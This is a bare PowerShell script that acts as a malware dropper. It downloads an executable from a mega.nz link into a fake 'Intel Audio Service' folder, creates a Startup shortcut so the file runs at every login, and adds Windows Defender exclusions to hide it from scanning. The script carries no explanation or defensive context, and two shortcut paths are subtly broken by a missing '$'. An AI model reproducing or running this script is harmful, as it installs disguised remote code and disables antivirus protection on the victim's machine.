clear

If(!(test-path -PathType container "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service"))
{
      New-Item -ItemType Directory -Path "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service"
}

Invoke-WebRequest "https://mega.nz/file/yZVCgCLK#LlLgxVgrn_7RfrNk8a-JU-J8X8oOrNTfZWEpNLSUWQg" "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\IntelAudioService.exe"

$WshShell = New-Object -COMObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Intel Audio Service.lnk")
$Shortcut.TargetPath = "env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\IntelAudioService.exe"
$Shortcut.Save()

Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Intel Audio Service.lnk"
Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service\IntelAudioService.exe"

